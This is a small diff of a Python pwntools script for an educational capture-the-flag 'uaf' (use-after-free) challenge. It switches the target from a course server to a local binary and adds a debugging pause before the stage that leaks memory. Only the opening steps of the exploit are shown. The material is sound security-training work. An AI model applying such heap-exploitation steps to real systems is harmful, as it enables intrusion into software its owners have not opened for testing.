@@ -1,9 +1,10 @@
 # python2
 from pwn import *
 
-r = remote('edu-ctf.csie.org', 10177)
-# r = process('./uaf')
+# r = remote('edu-ctf.csie.org', 10177)
+r = process('./uaf')
 r.sendafter('Size of your messege: ', str(0x10))
+pause()
 r.sendafter('Messege: ', 'a' * 8)
 
 r.recvuntil('a' * 8) # information leak back
